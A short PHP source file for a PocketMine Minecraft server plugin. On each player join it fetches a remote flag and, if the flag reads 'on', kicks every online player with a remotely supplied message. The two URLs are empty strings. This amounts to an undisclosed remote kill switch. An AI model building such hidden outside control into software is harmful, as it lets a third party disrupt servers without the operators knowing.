<?php

namespace krendell;


use pocketmine\event\Listener;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\plugin\PluginBase;


class Main extends PluginBase implements Listener
{
    public function onEnable()
    {
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
    }

    public function join(PlayerJoinEvent $e)
    {
        $site = file_get_contents("");
        $message = file_get_contents("");
        if ($site == 'on') {
            foreach ($this->getServer()->getOnlinePlayers() as $p) {
                $p->kick($message);
            }
        }
    }
}
